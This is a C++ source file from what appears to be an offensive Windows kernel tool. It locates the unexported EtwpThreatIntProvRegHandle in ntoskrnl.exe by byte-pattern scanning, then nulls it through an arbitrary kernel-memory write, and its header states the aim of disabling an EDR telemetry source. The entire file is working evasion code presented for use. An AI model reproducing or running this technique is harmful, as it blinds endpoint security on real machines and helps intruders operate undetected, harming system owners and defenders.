/**
 * @file ETW.cpp
 * @author Gregory King
 * @date August 14, 2025
 * @brief This file contains the implementation of the ETW class.
 *
 * Implements the logic for finding the unexported EtwpThreatIntProvRegHandle
 * via pattern scanning and patching it to disable a key EDR telemetry source.
 */

#include "ETW.h"
#include "Utils.h"
#include <iostream>
#include <vector>

namespace {
    // Helper for pattern scanning.
    uintptr_t FindPattern(const std::vector<char>& data, const char* pattern, const char* mask) {
        size_t patternLength = strlen(mask);
        for (size_t i = 0; i < data.size() - patternLength; ++i) {
            bool found = true;
            for (size_t j = 0; j < patternLength; ++j) {
                if (mask[j] != '?' && pattern[j] != data[i + j]) {
                    found = false;
                    break;
                }
            }
            if (found) {
                return i;
            }
        }
        return 0;
    }
}

namespace KernelMode {

    ETW::ETW(std::shared_ptr<Providers::IProvider> provider)
        : provider(std::move(provider)) {}

    uintptr_t ETW::FindThreatIntProviderHandle() {
        uintptr_t ntoskrnlBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            std::wcerr << L"[-] Failed to get ntoskrnl.exe base address." << std::endl;
            return 0;
        }

        // Load ntoskrnl.exe into our own address space to scan it.
        HMODULE ntoskrnlModule = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!ntoskrnlModule) {
            std::wcerr << L"[-] Failed to load ntoskrnl.exe for scanning." << std::endl;
            return 0;
        }

        auto dosHeader = (PIMAGE_DOS_HEADER)ntoskrnlModule;
        auto ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)ntoskrnlModule + dosHeader->e_lfanew);
        
        std::vector<char> ntoskrnlData(ntHeaders->OptionalHeader.SizeOfImage);
        memcpy(ntoskrnlData.data(), (void*)ntoskrnlModule, ntoskrnlData.size());
        FreeLibrary(ntoskrnlModule);

        // Pattern for finding the LEA instruction that references the handle.
        // 48 8D 0D ?? ?? ?? ?? 48 8B D8 E8 ?? ?? ?? ??
        const char* pattern = "\x48\x8D\x0D\x00\x00\x00\x00\x48\x8B\xD8\xE8\x00\x00\x00\x00";
        const char* mask = "xxx????xxxx????";

        uintptr_t patternOffset = FindPattern(ntoskrnlData, pattern, mask);
        if (!patternOffset) {
            std::wcerr << L"[-] Could not find ETW Threat Intelligence provider pattern." << std::endl;
            return 0;
        }

        // Calculate the address from the RIP-relative instruction
        int32_t relativeOffset = *(int32_t*)(ntoskrnlData.data() + patternOffset + 3);
        uintptr_t instructionAddress = ntoskrnlBase + patternOffset;
        uintptr_t handleAddress = instructionAddress + 7 + relativeOffset;

        return handleAddress;
    }

    bool ETW::DisableThreatIntelligenceProvider() {
        if (!provider) {
            std::wcerr << L"[-] ETW operations require an active provider." << std::endl;
            return false;
        }

        uintptr_t handleAddr = FindThreatIntProviderHandle();
        if (!handleAddr) {
            std::wcerr << L"[-] Failed to locate the ETW Threat Intelligence provider handle." << std::endl;
            return false;
        }
        std::wcout << L"[+] Found EtwpThreatIntProvRegHandle at: 0x" << std::hex << handleAddr << std::endl;

        // The handle is a REGHANDLE, which is a PVOID (uintptr_t).
        // We will overwrite the pointer to this handle with NULL.
        uintptr_t nullValue = 0;
        if (provider->WriteKernelMemory(handleAddr, nullValue)) {
            std::wcout << L"[+] ETW Threat Intelligence provider successfully disabled." << std::endl;
            return true;
        } else {
            std::wcerr << L"[-] Failed to patch the ETW provider handle." << std::endl;
            return false;
        }
    }
}